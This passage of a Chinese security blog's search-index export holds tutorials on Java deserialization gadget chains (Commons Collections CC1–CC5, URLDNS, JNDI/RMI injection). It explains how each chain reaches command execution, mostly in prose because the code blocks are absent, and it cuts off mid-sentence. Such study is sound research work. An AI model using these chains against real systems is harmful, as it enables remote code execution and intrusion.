5分析","date":"2022-09-19T11:31:50.000Z","url":"/2022/09/19/Java%20%20Commons%20Collection%205%E5%88%86%E6%9E%90/","categories":[[" ",""]],"content":"前言CC5和CC1的相似度很高，分析过CC1就很容易看懂CC5了。 可参考：Java Commons Collection 1分析 环境搭建 JDK 1.8 Commons Collections 3.1 pom.xml中添加： 利用链 ysoserial中提示到这只适用于JDK 8u76，并且没有安全管理器；[1] 前置知识CC5中涉及到两个新的类，这里先介绍一下： TiedMapEntry[2] 该类有两个参数，一个Map类型，一个Object类型；后面我们会使用到它的getValue和toString方法。 BadAttributeValueExpException[3] 该类只有一个val参数。 POC分析 代码1 这一部分和CC1中LazyMap链一样，只要调用了LazyMap.get()，就可以触发ChainedTransformer.transform()，进而对transformers数组进行回调，然后执行命令。 代码2 TiedMapEntry.getValue()调用了get()，参数map是可控的；[4] 所以实例化TiedMapEntry类，将outerMap传进去，第二个参数可以随便填，用来占位； 接着，toString()方法又调用了getValue()方法；[5] 继续找哪里调用了toString()方法；BadAttributeValueExpException.readObject()调用了toString()方法；[6] valObj是从gf中的val参数获取的，而gf又是从反序列化流中读取的；所以，相当于控制了val参数，就控制了valObj，这里就通过反射给val赋为TiedMapEntry类的实例化对象；即调用了TiedMapEntry.toString()，这样就满足了命令执行需要的所以条件。 POC调试从BadAttributeValueExpException,readObject()跟起，valObj就获取到TiedMapEntry类的对象；[7] 跟进toString；[8] 跟进getValue；[9] 跟进get，这里出现了一点问题，map中包含了一个key为123，所以if判断为假，并没有进如if；[10] 按道理是该进入if的，我又尝试了几次；只在这个if这里断点，前面的断点都取消掉，那么map就没有key，可以进入if；[11] 不知道这是什么原因，猜测是跟IDEA的调试机制有关吧； 继续，就跟到了ChainedTransformer.transform()，这里就对tranaforms数组进行循环回调；[12] 循环到第三次InvokerTransformer.transform()；[13] return后，成功执行命令；[14]"},{"title":"Java  Commons Collection 4分析","date":"2022-09-19T11:30:59.000Z","url":"/2022/09/19/Java%20%20Commons%20Collection%204%E5%88%86%E6%9E%90/","categories":[[" ",""]],"content":"前言CC4相当于是CC2和CC3的结合，只要熟悉前面几条链了，这条链也就很容易看懂了；CC4和CC2一样是通过调用TransformingComparator.compare()来实现transform()的调用；和CC3一样是通过实例化TrAXFilter类，然后调用它的构造方法，进而实现newTransformer()的调用； 可参考：Java Commons Collection 2分析Java Commons Collection 3分析 环境搭建 JDK 1.7 commons-collections 4.0 javassist pom.xml中添加： 利用链 POC分析 代码1使用javassit创建一个类，这个类中包含static代码块，其中包含恶意命令执行代码，只要实例化这个类，就会执行static中的代码；最后把该类转换为字节码存到targetByteCodes数组中； 代码2实例化一个 TemplatesImpl类对象，给一些参数赋值，赋值原因CC2中说明了原因； 代码3将TrAXFilter.class传给ConstantTransformer，那么就会返回TrAXFilter类，然后传给InstantiateTransformer，在InstantiateTransformer类中就会实例化TrAXFilter类，然而调用它的构造方法，进而调用newTransformer()方法，从而实现命令执行； [1][2] 代码4实例化一个TransformingComparator对象，将transformer传进去；实例化一个PriorityQueue对象，传入不小于1的整数，comparator参数就为null； 代码5新建一个对象数组，第一个元素为templates，第二个元素为1；然后通过反射将该数组传到queue中； 代码6通过反射将queue的size设为2，因为在PriorityQueue.heapify()中，size的值需要大于1才能进入下一步；（CC2中有说到） [3]代码7通过反射给queue的comparator参数赋值，从而调用到compare()方法，实现transform()的调用； POC调试还是从PriorityQueue.readObject()开始；queue[]里面是我们传入的TemplatesImpl类的实例化对象和整数1；[4] 跟进heapify()，size值为2；[5] 跟进siftDown，comparator参数不为null；[6] 跟进siftDownUsingComparator，调用了compare()；[7] 跟进compare()，obj1就是传入的templates，this.transformer是ChainedTransformer的实例化对象，也就是调用了ChainedTransformer.transform()；[8] 跟进ChainedTransformer.transform()，进入循坏；第一轮iTransformer参数值为ConstantTransformer，即调用了ConstantTransformer.transform()；[9] 跟进ConstantTransformer.transform()，iConstant参数值为传入的TrAXFilter.class，即返回了TrAXFilter类[10] 回到ConstantTransformer.transform()进入第二轮循环，这次的iTransformer参数值为InstantiateTransformer，object参数值为TrAXFilter；[11] 跟进InstantiateTransformer.transform()，返回TrAXFilter类对象；[12] 在实例化TrAXFilter类时，调用了它的构造方法，其中调用了templates.newTransformer()；[13] 后面就和CC2一样啦，到这里实例化了javassit新建类；[14] 命令执行成功；[15]"},{"title":"Java  Commons Collection 3分析","date":"2022-09-19T11:30:58.000Z","url":"/2022/09/19/Java%20%20Commons%20Collection%203%E5%88%86%E6%9E%90/","categories":[[" ",""]],"content":"前言CC3相当于CC1和CC2的结合，仔细分析过CC1和CC2来看CC3就非常简单。 可参考：Java Commons Collection 1分析Java Commons Collection 2分析 环境搭建 JDK 1.7 Commons Collections 3.1 javassist pom.xml中添加： 利用链 前置知识CC3中会用到两个新的类，这里先介绍一下： TrAXFilter[1] 在该类的构造方法中，调用了传入参数的newTransformer()方法，看到这个方法有点熟悉了，可以实现命令执行，并且参数可控；CC2中，就是在InvokerTransformer.transform()中通过反射调用TemplatesImpl.newTransformer()方法，而CC3中，就可以直接使用TrAXFilter来调用newTransformer()方法。 InstantiateTransformer该类实现了Transformer、Serializable接口；[2] 在它的transform()方法中，判断了input参数是否为Class，若是Class，则通过反射实例化一个对象并返回；[3] POC分析 前面基本是CC2的内容；代码1 使用javassit创建一个类，这个类中包含static代码块，其中包含命令执行代码，只要实例化这个类，就会执行static中的代码；最后把该类转换为字节码存到targetByteCodes数组中； 代码2 实例化一个 TemplatesImpl类对象，给一些参数赋值，赋值原因CC2中说明了原因； 代码3 这里有一些不一样，将TrAXFilter.class传给ConstantTransformer，那么就会返回TrAXFilter类，然后传给InstantiateTransformer，在InstantiateTransformer类中就会实例化TrAXFilter类，然而调用它的构造方法，进而调用newTransformer()方法，从而实现命令执行；然后就是要找到调用ChainedTransformer.transform()的地方，才能对transformers 数组进行回调； 接下来就是CC1的内容了；代码4 new了一个LazyMap的对象，LazyMap的get()方法调用了transform()方法，factory参数就是传入的transformerChain，达到了代码3的条件；[4] 接着就是要找一个调用get()的地方，代码5 还是P牛那句话： 我们如果将AnnotationInvocationHandler对象用Proxy进行代理，那么在readObject的时候，只要调用任意方法，就会进入到AnnotationInvocationHandler#invoke方法中，进而触发我们的LazyMap#get。 AnnotationInvocationHandler是调用处理器，outerMap是被代理的对象，只要调用了LazyMap中的任意方法，就会触发AnnotationInvocationHandler中的invoke方法； 而在readObject方法中调用了entrySet()方法，所以触发invoke；[5] 在invoke方法中就调用了get方法；[6] 这样就基本上达到了执行命令所需要的条件。 调试看看；this.memberValues参数值为LazyMap，调用了它的entrySet方法，触发到invoke方法；[7] 跟进get方法，factory参数为ChainedTransformer的实例化对象，这里调用了它的transform方法；[8] 跟进到ChainedTransformer.transform()，对transformers[]数组进行循环；[9] 第一轮循环，iTransformers[0]参数值为ConstantTransformer，进入它的transform方法，返回TrAXFilter类；[10] 第二轮循坏，iTransformers[1]参数值为InstantiateTransformer，TrAXFilter作为参数传入transform方法；[11] 跟进它的transform方法，input参数值为TrAXFilter，iParamTypes参数值为Templates，iArgs参数值为TemplatesImpl的实例化对象templates，return了TrAXFilter类对象；[12] 在getConstructor(iParamTypes)获取它参数为Templates类的构造方法时，调用了TransformerImpl的newTransformer()；[13] 跟进newTransformer()，调用了getTransletInstance()方法；[14] 跟进，_name参数值为我们传入的blckder02，进入第二个if，_class参数值为null，_bytecodes参数值为用javassit创建的类的字节码；最后实例化_class[_transletIndex]，该参数的值就为EvilCat606069074499600[15] 执行static中的代码；[16] 命令执行成功；[17]"},{"title":"Java  Commons Collection 2分析","date":"2022-09-19T11:30:57.000Z","url":"/2022/09/19/Java%20%20Commons%20Collection%202%E5%88%86%E6%9E%90/","categories":[[" ",""]],"content":"环境搭建CC2使用的是javassist和PriorityQueue来构造利用链；并且使用的是commons-collections-4.0版本，该版本删除了lazyMap的decode方法，所以CC1不用4.0版本；而3.1-3.2.1版本中TransformingComparator并没有去实现Serializable接口，也就是说这是不可以被序列化的，所以CC2不用3.x版本。 在pom.xml中添加： 利用链 利用链1分析跟着利用链，首先看看PriorityQueue.readObject()[1] 这里的queue[i]是从readObject得到的，再看看writeObject；[2] writeObject中依次将queue[i]进行序列化，那么我们通过反射实例化PriorityQueue类的对象，给queue[i]赋值，就实现了对queue[i]的控制。 最后调用了heapify方法，跟进：[3] 当i&gt;=0时进入for循环，而i=(size &gt;&gt;&gt; 1) -1将size进行了右移操作，所以size&gt;1才能进入循环。 再跟进siftDown方法：[4] x就是queue[i]，跟进siftDownUsingComparator方法：[5] 重点在comparator.compare(x, (E) c)；跟进可以看到Comparator是一个接口，compare是它的抽象方法；[6] CC2利用链中TransformingComparator类实现了compare方法；[7] 该方法中调用了this.transformer.transform()方法，看到这里，就有点熟悉了，this.transformer又是我们可控的，后面的理解和CC1差不多了。 POC1分析 代码1通过反射获取Runtime对象； 代码2当调用ChainedTransformer的transformer方法时，对transformers数组进行回调，从而执行命令；将transformerChain传入TransformingComparator，从而调用transformer方法；new一个PriorityQueue对象，传入一个整数参数，且传入的数值不能小于1，再将Tcomparator传入。 代码3前面说到，size的值要大于1，所以向queue中添加两个元素。 添加上序列化和反序列化代码后，能成功执行命令，但是没有生成序列化文件，也就是没有cc2.txt。 调试代码看一看，跟进PriorityQueue类，这里comparator参数是我们传入的Tcomparator；[8] 继续跟，跟进queue.add(2)，调用了offer方法；[9] 跟进offer方法，进入else分支，调用了siftUp方法；[10] 跟进siftUp方法，comparator参数不为null，进入if分支，调用siftUpUsingComparator方法；[11] 继续跟，来到重点代码；[12] 跟进，这里会执行两次命令；[13] 但是return的值为0，程序就结束了，并没有执行POC后面序列化和反序列化的代码。 那么如何让return不为0呢。既然调用siftUpUsingComparator方法会出错，那试试调用siftUpComparable方法，即comparator参数为null，修改代码，不传入comparator参数。 再调试看看；这下comparator参数就为null；[14] 照样进入queue.add(2)，到siftUp方法，就进入else分支，调用siftUpComparable方法；[15] 这样就只是单纯给queue[1]赋值，并不会调用compare方法；[16] 返回后就执行序列化代码，但是并没有执行命令，还要改进； 代码4上面修改后的代码没有调用到compare方法，我们可以在向queue中添加元素后，通过反射将Tcomparator传入到queue的comparator参数； 这样comparator参数就不为null，当反序列化时调用readObject方法时就会进入siftDownUsingComparator方法，调用compare方法，从而执行命令。[17] 完整POC Javassit补充简述：Javassist是一个开源的分析、编辑和创建Java字节码的类库，可以直接编辑和生成Java生成的字节码。能够在运行时定义新的Java类，在JVM加载类文件时修改类的定义。Javassist类库提供了两个层次的API，源代码层次和字节码层次。源代码层次的API能够以Java源代码的形式修改Java字节码。字节码层次的API能够直接编辑Java类文件。 下面大概讲一下POC中会用到的类和方法： ClassPoolClassPool是CtClass对象的容器，它按需读取类文件来构造CtClass对象，并且保存CtClass对象以便以后使用，其中键名是类名称，值是表示该类的CtClass对象。 常用方法： static ClassPool getDefault()：返回默认的ClassPool，一般通过该方法创建我们的ClassPool； ClassPath insertClassPath(ClassPath cp)：将一个ClassPath对象插入到类搜索路径的起始位置； ClassPath appendClassPath：将一个ClassPath对象加到类搜索路径的末尾位置； CtClass makeClass：根据类名创建新的CtClass对象； CtClass get(java.lang.String classname)：从源中读取类文件，并返回对CtClass 表示该类文件的对象的引用； CtClassCtClass类表示一个class文件，每个CtClass对象都必须从ClassPool中获取。 常用方法： void setSuperclass(CtClass clazz)：更改超类，除非此对象表示接口； byte[] toBytecode()：将该类转换为类文件； CtConstructor makeClassInitializer()：制作一个空的类初始化程序（静态构造函数）； 示例代码 新生成的类是这样子的，其中有一块static代码；[17-1] 当该类被实例化的时候，就会执行static里面的语句；[17-2] 利用链2分析在ysoserial的cc2中引入了 TemplatesImpl 类来进行承载攻击payload，需要用到javassit； 先给出POC： 代码1通过反射实例化InvokerTransformer对象，设置InvokerTransformer的methodName为newTransformer； 代码2实例化一个TransformingComparator对象，将transformer传进去；实例化一个PriorityQueue对象，传入不小于1的整数，comparator参数就为null； 代码3这里就要用到javassit的知识； 这段代码会新建一个类，并添加了一个static代码块；[17-3] 代码4使用TemplatesImpl的空参构造方法实例化一个对象；再通过反射对个字段进行赋值，为什么要这样赋值下面再说； 代码5新建一个对象数组，第一个元素为templates，第二个元素为1；然后通过反射将该数组传到queue中； 代码6通过反射将queue的size设为2，与POC1中使用两个add的意思一样； 代码6通过反射给queue的comparator参数赋值； 从PriorityQueue.readObject()方法看起，queue变量就是我们传入的templates和1，size也是我们传入的2；[18] 跟进siftDown方法，comparator参数就是我们传入的TransformingComparator实例化的对象；[19] 到TransformingComparator的compare方法，obj1就是我们传入的templates， 这里的this.transformer就是我们传入的transformer；[20] 跟到InvokerTransformer.transform()，input就是前面的obj1，this.iMethodName的值为传入的newTransformer，因为newTransformer方法中调用到了getTransletInstance方法；[21] 接着调用templates的newTransformer方法，而templates是TemplatesImpl类的实例化对象，也就是调用了TemplatesImpl.newTransformer()；跟踪该方法；[22] 继续跟踪getTransletInstance方法；进行if判断，_name不为空，_class为空，才能进入defineTransletClasses方法；这就是代码4中赋值的原因；[23] 跟进defineTransletClasses方法；[24] _bytecodes也不能为null，是我们传入的targetByteCodes，也就是代码3的内容，转换成字节数组是一串这样子的；[25] 继续往下；[26] 通过loader.defineClass将字节数组还原为Class对象，_class[0]就是javassit新建的类EvilCat1153850011981000；[26-1] 再获取它的父类，检测父类是否为ABSTRACT_TRANSLET，所以代码3中要设置AbstractTranslet类为新建类的父类； 给_transletIndex赋值为0后，返回到getTransletInstance方法，创建_class[_transletIndex]的对象，即创建EvilCat1153850011981000类的对象，那么该类中的static代码部分就会执行，成功执行命令；[27] 小结利用链1利用链1相对来说比较简单，只要控制好comparator什么时候为null，什么时候有值，就可以成功生成序列化文件和执行命令； 通过反射获取Runtime对象（得到transformers数组） 利用ChainedTransformer对transformers数组进行回调 调用TransformingComparator.compare触发transformer方法 this.transformer参数可控，传入恶意内容 利用链2利用链2用到了javassit，简单来说就是利用javassit的特点，可以新建一个类，并且可以向该类中插入恶意代码，由static修饰，当别处实例化这个类的时候就会执行static中的恶意代码； 所以整条链都是为了满足能成功实例化新建类而添加的条件；AbstractTranslet translet = (AbstractTranslet) _class[_transletIndex].newInstance() 参考连接："},{"title":"Java  Commons Collection 1分析","date":"2022-09-19T11:30:56.000Z","url":"/2022/09/19/Java%20%20Commons%20Collection%201%E5%88%86%E6%9E%90/","categories":[[" ",""]],"content":"前言Java集合框架是JDK1.2中的一个重要补充。它添加了许多功能强大的数据结构，加快了最重要的Java应用程序的开发。从那时起，它已成为Java中公认的集合处理标准。Commons集合试图通过提供新的接口、实现和实用程序来构建JDK类。 Commons Collections是反序列化漏洞学习过程中不可缺少的一部分，Apache Commons Collections是Java中应用广泛的一个库，包括Weblogic、JBoss、WebSphere、Jenkins等知名大型Java应用都使用了这个库。 ysoerial中CommonsCollection1源码如下： 利用链： 环境搭建创建一个Maven项目，不用选择任何Maven模板；在pom.xml中添加如下代码： 刷新一下，成功导入commons-collections-3.1。[1] JDK1.7 相关类和接口TransformedMapTransformedMap⽤于对Java标准数据结构Map做⼀个修饰，被修饰过的Map在添加新的元素时，将可以执⾏⼀个回调。 ChainedTransformerChainedTransformer是实现了Transformer、Serializable接⼝的⼀个类，它的作⽤是将内部的多个Transformer串在⼀起，将前一个回调返回的结果作为后一个的参数传入。 TransformerTransformer是一个接口，只有一个带实现的方法；TransformedMap在转换Map的新元素时，就会调⽤transform⽅法，这个过程就类似在调⽤⼀个“回调函数”，这个回调的参数是原始对象。 ConstantTransformerConstantTransformer是实现了Transformer、Serializable接口的一个类，它的过程就是在构造函数的时候传入一个对象，并在transform方法将这个对象再返回； 作用就是包装任意一个对象，在执行回调时返回这个对象，进而方便后续操作。 InvokerTransformerInvokerTransformer是实现了Transformer、Serializable接⼝的⼀个类，这个类可以⽤来执⾏任意⽅法，这也是反序列化能执⾏任意代码的关键； 在实例化这个InvokerTransformer时，需要传⼊三个参数： 第⼀个参数是待执⾏的⽅法名 第⼆个参数是这个函数的参数列表的参数类型 第三个参数是传给这个函数的参数列表 后面transform方法，通过反射调用执行了input对象的iMethodName方法。 TransformedMap链Test1先构造一个简单的POC： Transformer是一个接口，ConstantTransformer和InvokerTransformer都是Transformer接口的实现类；这里并不是new了一个接口，而是new了一个Transformer类型的数组，里面存储的是 Transformer的实现类对象。 然后使用ChainedTransformer对transformers 数组进行一系列回调； 将创建的innerMap和transformerChain传入TransformedMap.decorate；最后要向Map中放入一个新元素，从而执行命令。[2] Test2上面的Test1并只是一个本地测试，而我们还需要将最终生成的outerMap对象变成一个序列化流；代码1Runtime类没有实现Serializable接⼝，不能被直接序列化；所以我们需要通过反射来获取Runtime对象； 代码2当调用ChainedTransformer的transformer方法时，会对transformers数组进行一系列回调： 将ConstantTransformer返回的Runtime.class传给第一个InvokerTransformer； 将第一个InvokerTransformer返回的(Runtime.class).getMethod(&quot;getRuntime&quot;,null)传给第二个InvokerTransformer； 将第二个InvokerTransformer返回的((Runtime.class).getMethod(&quot;getRuntime&quot;,null)).invoke(null,null)传给第三个InvokerTransformer； (((Runtime.class).getMethod(&quot;getRuntime&quot;,null)).invoke(null,null)).exec(&quot;calc&quot;)是第三个InvokerTransformer的返回值。 代码3用了TransformedMap修饰Map对象，decorate方法中又new了一个TransformedMap对象，transformerChain作为参数传进去； TransformedMap类中的注释说到Map的put方法和Map.Entry的setValue方法会受到该类的影响；[3] TransformedMap继承于AbstractInputCheckedMapDecorator类，而AbstractInputCheckedMapDecorator又继承于AbstractMapDecorator类，AbstractMapDecorator类继承于Map类； 跟到AbstractInputCheckedMapDecorator类的setValue方法；[4]最后其实是调用Map.setValue()； 跟进checkSetValue方法到TransformedMap类，注释中也提到调用setValue方法时自动调用checkSetValue方法；这里调用了valueTransformer的transform方法，而valueTransformer就是我们传入的transformerChain，transformerChain又是ChainedTransformer的实例化对象，也就是成功调用了ChainedTransformer的transformer方法，从而实现代码2对transformers数组进行回调。[5] 代码4通过反射获取AnnotationInvocationHandler类对象，获取构造方法，实例化一个对象handler； 看一下sun.reflect.annotation.AnnotationInvocationHandler类，它的构造函数中第一个参数是个Annotation类，第⼆个是参数就是前⾯构造的Map；[6] 这是一个内部类，需要通过反射来获取；在它的readObject方法中调用了setValue方法，也就是说反序列化时会调用setValue方法，进而实现上面几部分代码。 然而只有当if判断为真时才会进入分支执行setValue方法，也就是说var7不能为null；var7不为null需要满足以下两个条件： 第一个参数必须是Annotation的⼦类，且其中必须含有⾄少⼀个⽅法，假设方法名为X 被TransformedMap.decorate修饰的Map中必须有⼀个键名为X的元素 而Retention恰好是Annotation类，含有⼀个value方法；[7] 所以这里是创建Retention.class的对象；然后，为了再满⾜第⼆个条件，需要给Map中放⼊⼀个键名为value的元素，所以在代码3中要给Map对象加一个键名为value的元素； 下面大概跟一下为什么键名要和方法名相同；在AnnotationInvocationHandler的readObject方法中，跟进 [8] var0就是我们传入的Retention，再跟进AnnotationType；[9] 第一处返回了Retention类中的所有方法到var2；第二处通过for循坏，获取方法名到var7；第三处将获取到的方法名put到memberTypes。 Retention类中就只有一个value方法，所以memberTypes的值就是value；再回到AnnotationInvocationHandler类，var3的值就是value； 接下来： 所以为了能var3中找到键名为value的值，需要给Map对象put一个键名为value的元素。 最后加上序列化和反序列化的代码，整理为如下POC： [10] 这个POC只有在Java 8u71以前的版本中才能执行成功，Java 8u71以后的版本由于sun.reflect.annotation.AnnotationInvocationHandler发⽣了变化导致不再可⽤；在ysoserial的代码中，没有⽤到上面POC的TransformedMap，而是改用了了LazyMap。 LazyMap链LazyMap也来自于Common-Collections库，并继承AbstractMapDecorator类。LazyMap的漏洞触发点和TransformedMap唯一的差别是，TransformedMap是在写入元素的时候执行transform，而LazyMap是在其get方法中执行的factory.transform 。当在get找不到值的时候，它会调用factory.transform方法去获取一个值：[11] 代码1和代码2与TransformedMap链中的一样； 代码3 因为要满足map.containsKey(key) == false，就不需要向Map中添加元素；把transformerChain传进去，transformerChain是Transformer类型的；看一下LazyMap.decorate方法：[12] new了一个LazyMap对象；[13] get方法中的factory就是我们传入的transformerChain，也就是说，只要调用了get方法，并且Map对象中的没有key，就可以触发ChainedTransformer的transform方法，从而实现代码2对transformers数组进行回调，进而执行命令。 现在要找一个调用get方法的地方；在AnnotationInvocationHandler类的invoke方法中调用了get方法：[14] 那又要如何调用到invoke方法；P牛的文章中说到： 我们如果将AnnotationInvocationHandler对象用Proxy进行代理，那么在readObject的时候，只要调用任意方法，就会进入到AnnotationInvocationHandler#invoke方法中，进而触发我们的LazyMap#get。 Java动态代理知识可参考：Java 动态代理 代码4通过反射获取sun.reflect.annotation.AnnotationInvocationHandler对象，再对该对象进行Proxy； Proxy.newProxyInstance的第一个参数是ClassLoader，我们用默认的即可；第二个参数是我们需要代理的对象集合；第三个参数是一个实现了InvocationHandler接口的对象，里面包含了具体代理的逻辑。 代理后的对象叫做proxyMap，但不能直接对其进行序列化，因为入口点是sun.reflect.annotation.AnnotationInvocationHandler#readObject，所以我们还需要再用AnnotationInvocationHandler对这个proxyMap进行包裹： 最后添加上序列化和反序列化的代码整理为如下POC： 成功执行命令：[15] 参考连接：Java安全漫谈 - 09.反序列化篇(3)Java安全漫谈 - 10.反序列化篇(4)Java安全漫谈 - 11.反序列化篇(5)"},{"title":"Java URLDNS链分析","date":"2022-09-19T11:30:55.000Z","url":"/2022/09/19/Java%20URLDNS%E9%93%BE%E5%88%86%E6%9E%90/","categories":[[" ",""]],"content":"前言ysoserialysoserial是学习反序列化漏洞的一个重要工具，它集合了多种反序列化漏洞的payload，可以让用户根据自己选择的利用链，生成反序列化利用数据，通过讲这些数据发送给目标，从而执行用户预先定义的命令。下载地址：ysoserial 什么是利用链利用链也叫“gadget chains”，通常称为gadget。可以类比PHP反序列化，将gadget理解为一种方法，它连接的是从触发位置开始到执行命令位置结束，类似PHP中从__destruct到eval。 使用ysoserial可以容易的生成gadget对应的POC，例如： ysoserial⼤部分的gadget的参数就是⼀条命令，⽐如这⾥是id；⽣成好的POC发送给⽬标，如果⽬标存在反序列化漏洞，并满⾜这个gadget对应的条件，则命令id将被执⾏。 URLDNSURLDNS是ysoserial中一个利用链的名字，但准确来说，不能称作利用链。因为其参数不是一个可以“利用”的命令，而仅为一个URL，其能触发的结果也不是命令执行，而是一个DNS请求。 URLDNS有如下优点，适合在检测反序列化漏洞是使用： 使用Java内置的类构造，不依赖第三方库 在目标没有回显的时候，能够通过DNS请求得知是否存在反序列化漏洞 不限JDK版本 将下载的ysoserial用Intellij IDEA打开，进入ysoserial/src/main/java/ysoserial/payloads/URLDNS.java即可看到ysoserial中URLDNS的源码： 注释中给出了利用链： 利用链分析HashMap.java#readObject触发反序列化的方法一般就是readObject() 最后一行代码将key使用hash函数进行了处理； 跟进hash()函数； 这里的key是java.net.URL对象，值是传入的url，不为null，进入hashCode方法；URL.java#hashCode hashCode值等于-1时会进行handler.hashCode(this)计算；这里hanlder是URLStreamHandler对象（的某个⼦类对象），继续跟进hashCode方法；URLStreamHandler.java#hashCode 跟进getProtocol方法，是用来获取传入URL的协议名称； 再看getHostAddress方法；URLStreamHandler.java#getHostAddress InetAddress.getByName(host)是根据主机名获取其IP地址，这时候就会触发一次DNS请求。 漏洞测试在上获取一个子域名z57gpb.dnslog.cn作为url传入；[1]反序列化类： 测试类： URL类中hashCode成员变量是私有的，要加setAccessible(true)才能访问；[2] 先运行测试类，生成demo.txt文件，在运行反序列化类，成功触发DNS请求；[3] 小结利用链可归结为： HashMap-&gt;readObject() HashMap-&gt;hash() URL-&gt;hashCode() URLStreamHandler-&gt;hashCode() URLStreamHandler-&gt;getHostAddress() InetAddress-&gt;getByName() java.util.HashMap 重写了readObject方法，在反序列化时会调用hash函数计算key的 hashCode，而java.net.URL的hashCode在计算时会调用getHostAddress来解析域名，从而发出DNS请求. 参考连接：Java安全漫谈 - 08.反序列化篇(2)"},{"title":"Java JNDI","date":"2022-09-19T11:29:30.000Z","url":"/2022/09/19/Java%20JNDI/","categories":[[" ",""]],"content":"概述JNDI全称是Java命名和目录接口（Java Naming and Directory Interface），是Java中为命名和目录服务提供接口的API。 JNDI由Naming(命名)和Directory(目录)组成： 命名NamingNaming是指将对象通过唯一标识符(取个名字)绑定到一个容器环境Context中，以后又可以使用lookup方法从环境容器中根据这个唯一标识符找到所绑定的Java对象。 在真实的项目应用中，通常是由系统程序或框架程序先将资源对象绑定到JNDI环境中，以后在该系统或框架中运行的模块程序就可以从JNDI环境中查找这些资源对象进行使用，而不用关心数据源(DataSource)对象是如何创建出来的，这种方式极大的增强了系统的可维护性。 容器环境(Context) 本身也是一个Java对象，他可以通过一个名称绑定到另一个容器环境中。将一个Context对象绑定到另一个Context对象中，这就形成了一种父子级联关系，多个Context对象最终可以级联成一种树状结构，树中的每个Context对象中都可以绑定若干个Java对象。 [1] 上图中，每个方框都代表一个Context对象，名称分别为a、b、c、d，其中存在父子级关系；椭圆1、2、3、4、5、6、7则是绑定在容器环境中的Java对象，在同一个Context不能绑定两个相同名称的Java对象，在不同的Context中可以出现同名的Java对象。 调用Context对象的lookup方法可以获取其中绑定的Java对象，也可以获取其所在Context树状结构中的任意一个Context对象，包括它的父级和子级，只需要在lookup方法中指定相应的Context路径即可。 要执行JNDI命名操作，必须获取一个作为操作入口的Context对象，在JNDI API中，提供了InitialContext类来创建Context对象。InitialContext类实现了Context接口，上面所说的Context对象其实是Context接口的某个实现类中的实例对象。 目录DirectoryJNDI中的目录与文件目录不同，JNDI中的目录是指将一个对象的所有属性信息保存到一个容器环境中，与JNDI的命名原理相似，只不过目录容器环境中保存的是对象的属性，而不是对象本身，所以JNDI的目录提供的是对属性的各种操作。 JNDI API中提供了DirContext接口来完成目录相关操作，该接口继承了Context接口，名称(Name)可以作为参数传给DirContext，所以它也能完成命名的相关操作。 [2] 上图中，每个方框都代表一个DirContext对象，名称分别为a、b，b是a的子DirContext椭圆dog、cat则是绑定在目录容器环境中的Java对象；圆角矩形代表某个对象的属性。一个DirContext容器环境中既可以绑定java对象本身，也可以绑定对象的属性，尽管它们的名字相同，但是对它们的操作是独立的；并且一个属性可以拥有多个属性值。 同样，要执行JNDI命名与目录属性操作，必须获取一个作为操作入口的DirContext对象，JNDI API中提供了一个InitialDirContext类来创建DirContext对象。 下面再具体介绍相关类的使用。 JNDI 相关APIJava JDK中提供了java.naming模块，其中包含5个包： javax.naming：提供用于访问命名服务的类和接口 javax.naming.directory：扩展 javax.naming程序包以提供访问目录服务的功能 javax.naming.event：在访问命名和目录服务时为事件通知提供支持 javax.naming.ldap：提供对LDAPv3扩展操作和控件的支持 javax.naming.spi：提供通过 javax.naming和相关软件包动态插入支持访问命名和目录服务的 javax.naming Class InitialContext实现了Context接口，已知直接子类有InitialDirContext；构造方法： InitialContext()：构造一个初始上下文 InitialContext(boolean lazy)：构造一个初始上下文，可以选择不初始化它 InitialContext(Hashtable&lt;?, ?&gt; environment)：使用提供的环境构造初始上下文。 常用方法： bind(Name name, Object obj)：将名称绑定到对象 list(String name)：枚举在命名上下文中绑定的名称以及绑定到它们的对象的类名 lookup(String name)：检索命名对象 rebind(String name, Object obj)：将名称绑定到对象，覆盖任何现有绑定 unbind(String name)：取消绑定命名对象 示例代码： Class Reference实现了Serializable 、Cloneable接口，已知直接子类有LinkRef；此类表示对在命名&#x2F;目录系统外部找到的对象的引用；Reference提供了一种记录有关对象的地址信息的方法，这些对象本身并不直接绑定到命名&#x2F;目录系统。 构造方法： Reference(String className)：为类名为“className”的对象构造一个新引用 Reference(String className, String factory, String factoryLocation)：构造具有类名“className”的对象的新引用，以及对象工厂的类名和位置 Reference(String className, RefAddr addr)：为类名为“className”的对象和地址构造一个新引用 Reference(String className, RefAddr addr, String factory, String factoryLocation)：构造具有类名“className”的对象的新引用，对象工厂的类名和位置以及对象的地址 常用方法： void add(int posn, RefAddr addr)：将地址添加到索引posn的地址列表中 void add(RefAddr addr)：将地址添加到地址列表的末尾 void clear()：从此引用中删除所有地址 RefAddr get(int posn)：检索索引posn上的地址 RefAddr get(String addrType)：检索地址类型为“addrType”的第一个地址 Enumeration&lt;RefAddr&gt; getAll()：检索本参考文献中地址的列举 String getClassName()：检索引用引用的对象的类名 String getFactoryClassLocation()：检索此引用引用的对象的工厂位置 String getFactoryClassName()：检索此引用引用对象的工厂的类名 Object remove(int posn)：从地址列表中删除索引posn上的地址 int size()：检索此引用中的地址数 String toString()：生成此引用的字符串表示形式 示例代码： 这里将reference传入了ReferenceWrapper类，因为在RMI中说到过，远程接口要继承java.rmi.Remote接口，表明这个接口可以被远程调用；而远程接口实现类还必须继承java.rmi.server.UnicastRemoteObject。可参考：Java RMI Reference类既没有实现远程接口，又没有继承UnicastRemoteObject，所以不能直接使用；而ReferenceWrapper类继承了UnicastRemoteObject类，还实现了RemoteReference接口；[3] RemoteReference接口又继承了Remote接口，所以Reference对象要用ReferenceWrapper封装一下。[4] 造成JNDI注入的原因则是initialContext.lookup(url)中的url可控，即查询的远程对象可控，通过构造恶意远程对象，对目标服务发起攻击。 JNDI+RMI实现攻击示例代码代码就是上面的两个示例，这里再写一下； JNDI_Server： JNDI_Client： 还要写一个要加载的恶意类，把编译后的class文件放到可访问的网站上，如url = &quot;;；这里要注意必须得去掉package ...后再编译，不然执行不成功。CalcCmd： 代码写好后，先启动服务端，开启监听，再启动客户端；成功加载到远程对象；[5] 流程分析还是先启动服务端，然后在initialContext.lookup(url)处断点；跟进lookup，这里是解析name的上下文；[6] 跟进下一个lookup，检索解析成功的对象，继续查找为解析的名称部分；[7] 跟进下一个lookup，到达decodeObject；[8] 跟进decodeObject，获取从ReferenceWrapper_Stub返回的Reference对象；[9] 跟进getObjectInstance，获取到了Factory的类名（CalcCmd），然后从Reference中获取Factory的实例；[10] 跟进getObjectFactoryFromReference，通过clas = 